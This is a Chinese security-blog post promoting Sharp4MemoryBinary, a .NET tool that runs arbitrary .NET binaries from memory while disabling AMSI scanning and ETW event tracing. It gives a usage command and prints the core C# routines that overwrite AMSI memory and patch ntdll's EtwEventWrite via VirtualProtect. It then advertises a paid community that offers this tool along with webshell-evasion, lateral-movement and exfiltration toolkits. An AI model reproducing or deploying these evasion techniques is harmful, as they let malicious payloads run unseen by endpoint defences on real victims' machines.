---
title: .NET 一款内存加载绕过ASMI和ETW的工具
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247496302&idx=1&sn=1651cd83cd887b7cb2f074936c111615&chksm=fa595c83cd2ed5959b1a0dabfd565ab22f224ceaaf36fe78ea8e4f6d3a65a908cf8811651cb3&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-10-30
fetch_date: 2025-10-06T18:52:58.663317
---

# .NET 一款内存加载绕过ASMI和ETW的工具

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9xces6eppp7B3ibrMwGbEO0D8icaCPIuaSeFMsfQyLq4CVS2FibD7adKVk7NZJtrz1riaZoVlibMNBjicw/0?wx_fmt=jpeg)

# .NET 一款内存加载绕过ASMI和ETW的工具

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

基本介绍

Sharp4MemoryBinary.exe 是一款通过将任意 .NET 二进制文件直接加载到内存中运行，避免了传统文件写入磁盘的检测方式。此外，还具备绕过 AMSI 和 ETW 的功能，能够在不触发反恶意软件扫描接口（AMSI）和事件跟踪（ETW）的情况下安全运行负载。这款工具在渗透测试和红队活动中应用广泛，尤其适用于需要绕过安全监控和日志记录的场景。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9xces6eppp7B3ibrMwGbEO0mRy1DCEtJWHHg1ia8DWbM9XR8lQ8nvJ10s30fgg8L1PHuHGLoDLzSBA/640?wx_fmt=jpeg&from=appmsg)

03

使用方法

通过以下示例命令，可以将 .NET 程序 Sharp4PowerShell.exe 通过内存加载的方式运行，并以管理员身份执行指定命令。

```
Sharp4MemoryBinary.exe --path Sharp4PowerShell.exe --args "Start-Process calc"
```

在此示例中，工具会将负载加载到内存中并执行 Start-Process calc 命令，以启动计算器。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y9xces6eppp7B3ibrMwGbEO0ljBtqCMribnloYWYpgjQUMgqqMzIThWicZYrL3uTqX6DJaxeMlFPobpg/640?wx_fmt=png&from=appmsg)

另外，还支持 Base64 编码的路径参数，通过 --b64 参数指定编码路径，以便在传输时避免路径被检测或拦截。

04

原理解析

Sharp4MemoryBinary 主要功能是将指定的 .NET 二进制文件直接加载到内存中执行，避免了在硬盘上存储恶意负载，从而减小了被检测到的风险。该工具支持直接从指定的本地文件加载和通过 SMB 网络路径访问负载路径。

首先，工具通过修改 AMSI 的相关内存区域，阻止系统对特定进程的扫描。PatchAMSI 函数的核心代码如下

```
```
private static void PatchAMSI()
{
    IntPtr amsiLibPtr = unProtect(getAMSILocation());
    if (amsiLibPtr != (IntPtr)0)
    {
        Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
    }
}
```
```

在此函数中，通过 getAMSILocation 定位 AMSI 的地址，然后通过 unProtect 方法解除保护，最后通过 Marshal.Copy 将自定义的 AMSI 补丁写入到目标内存中，从而绕过 AMSI 检测。

随着，工具通过补丁内存中的 EtwEventWrite 函数，使系统无法追踪特定事件。PatchETW 函数的核心代码如下所示。

```
```
private static void PatchETW()
{
    IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
    IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

    VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

    var patch = getETWPayload();
    uint oldProtect;

    if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
    {
        Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
        Console.WriteLine("[+] Successfully unhooked ETW!");
    }
}
```
```

这里，工具定位 ntdll.dll 库中的 EtwEventWrite 函数，然后使用 VirtualProtect 函数解除内存保护，最后通过 Marshal.Copy 将自定义的补丁写入到 EtwEventWrite 的内存地址中，以禁止 Windows 事件跟踪。

另外，在代码中，Sharp4MemoryBinary 实现了对传入参数的解析和负载路径的识别。例如，以下代码检查是否使用了 --path 参数来指定负载路径

```
```
if (argument.ToLower() == "-path" || argument.ToLower() == "--path")
{
    int argData = Array.IndexOf(args, argument) + 1;
    if (argData < args.Length)
    {
        string rawPayload = args[argData];
        if (base64Enc)
            payloadPathOrUrl = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
        else
            payloadPathOrUrl = rawPayload;
    }
}
```
```

该段代码可以解析路径参数，支持原始字符串路径或 Base64 编码的路径，通过 --b64 参数进行指定。综上，Sharp4MemoryBinary .exe 是一款功能强大的内存加载工具，具备绕过 AMSI 和 ETW 的能力。工具已经打包在星球，感兴趣的朋友可以加入自取。

05

推荐阅读

从漏洞分析到安全攻防，我们涵盖了.NET安全各个关键方面，为您呈现最新、最全面的.NET安全知识，下面是公众号发布的精华文章集合，推荐大家阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493952&idx=4&sn=db68011fb075c1d02268811163646b53&chksm=fa5947adcd2ecebbb1ca6659f289a5e344e37d1136fe0bd9272b5578e4c71bb19bb250e934d3&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9tl26Kh2sQYI9guTCflSwQP8Gs9z7iamicOvlQv4UYzjwd378D03h7yEYFtZ6xA74qicInoed7qpBWg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247495167&idx=1&sn=9280c55fdc7c9146e549be470cf9f120&chksm=fa594312cd2eca04bfe8fd1fd3890b389d9c700b9b69d897f919addac399bab4f4d2e55f6b4f&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOE2ogFoYIdqnYynqF6XyicI7XfRsWsn36wsCpKpAJcIQOicZUhbDJOe0w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488762&idx=1&sn=a5710927a6ba09b5c83adf616e2b12ae&chksm=fa5aba17cd2d330119d1ab2ce4b3a434274f0adf96729dbf8f04bef16c389565fc144f84d341&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

06

欢迎加入.NET安全星球

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。 星球门票后期价格随着内容和质量的不断沉淀会适当提高，因此越早加入越好！

    目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最活跃的技术知识库之一，从.NET Framework到.NET Core，从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的安全指南和最佳实践。

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多高质量的.NET安全资源，可以说市面上很少见，都是干货。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibzerwUbGOupPoJgYlZNMo1gg58eGoicPibjMBKkEo1zOia6zOyeupYasZZ9DTFvJVvzJQTEuhKrvTsA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOc2SogKzZ16SD7dpzF3v81kia4ZAx5QU5ibnNibEo8kZZSJgrficz4Ckxwg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

星球文化始终认为授人以鱼不如授人以渔！加入星球后可以跟星主和嘉宾们一对一提问交流，20+个专题栏目涵盖了点、线、面、体等知识面，助力师傅们快速成长！其中主题包括.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库等等。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz01qCxrYGBR94wibZ7sk1zIO9DzCgviab9vmUic8qmvynXhSM8LxFhGG97w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

    我们倾力打造专刊、视频等配套学习资源，循序渐进的方式引导加深安全攻防技术提高以及岗位内推等等服务。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9XgicSeCfnDO0KyvDNdCZhG3pTSWHRekG0Wrp0FXyHO1mz9ia5uiaICjCmg5jIzx4ERLU8MjXWVSkCw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

我们还有一个会员专属的内部星球陪伴群，加入的成员可以通过在群里提出问题或参与论的方式来与其他成员交流思想和经验。此外还可以通过星球或者微信群私聊向我们进行提问，以获取帮助迅速解决问题。

为了助力大家在2024国家级hvv演练中脱颖而出，我们特别整理出了一套涵盖dotNet安全矩阵星球的八大.NET相关方向工具集。

```
.NET 免杀WebShell
.NET 反序列化漏洞
.NET 安全防御绕过
.NET 内网信息收集
.NET 本地权限提升
.NET 内网横向移动
.NET 目标权限维持
.NET 数据外发传输
```

这些阶段所涉及的工具集不仅代表了当前.NET安全领域的最前沿技术，更是每一位网络安全爱好者不可或缺的实战利器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9ZQNibdZiazXl9zhxh3wB9n5LXcwJqbvQywJQLsckcGGV6NNWLITK1VkDV2CPeahvyUbPNPCRATEmA/640?wx_fmt=othe...